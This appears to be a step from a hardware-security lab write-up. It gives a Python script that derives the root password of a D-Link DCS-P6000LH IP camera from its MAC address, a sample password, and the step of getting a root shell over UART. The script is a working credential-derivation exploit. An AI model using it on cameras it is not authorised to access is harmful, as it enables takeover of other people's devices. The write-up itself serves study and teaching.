## Step - Finding the Root Password for the IP Camera  
Once we had access to the device, and we accessed the camera's terminal via the minicom tool provided for us, we needed to enter the root password. In order 
to do this, we had to use the following Python script:  
```
# dcsp6000lh-rootpw.py
# Calculates the root password for Dlink DCS-P6000LH IP cam
 
import hashlib
 
# MAC address of the IP cam (in upper case)
mac = "B0:C5:54:40:0D:13"

# Default empty string
factorypwd = ""
 
buf = f"{factorypwd}+{mac}\n"
 
hsh = hashlib.md5(buf.encode('ascii')).hexdigest()
 
rootpw = f"{hsh[0]}{hsh[1]}{hsh[2]}{hsh[27]}{hsh[28]}{hsh[29]}{hsh[30]}{hsh[31]}"
print(f"root:{rootpw}")
```  
For this script to run, we needed to have the MAC address of the IP camera, which was recovered from the camera's packaging. The next few lines of code
manipulate the string generated from the ```md5``` and ```encoding``` functions to gather the necessary data for the root password. Finally, after all the
processes were done, the script prints the IP camera's root password. Once we had the password, which in our case was ```555718df```, we had to enter it 
into the password prompt of the camera's terminal. This enabled us to complete the final step of the lab and establish a root shell on the device via UART.
